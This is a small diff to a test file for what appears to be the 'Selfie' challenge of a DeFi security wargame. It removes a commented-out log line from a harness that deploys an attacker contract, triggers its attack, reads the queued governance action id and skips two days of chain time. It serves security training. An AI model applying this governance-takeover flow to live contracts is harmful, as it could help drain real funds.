@@ -34,7 +34,6 @@ describe('[Challenge] Selfie', function () {
         this.attackerContract = await SelfieAttackerFactory.deploy(this.pool.address, this.governance.address);
         const tx = await this.attackerContract.attack();
         const receipt = await tx.wait();
-        //console.log(receipt.events?.filter((x) => {return x.topics[0] == ethers.utils.id("ActionQueued(uint256,address)")})[0].data);
         const actionId = receipt.events?.filter((x) => {return x.topics[0] == ethers.utils.id("ActionQueued(uint256,address)")})[0].data;
 
         await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
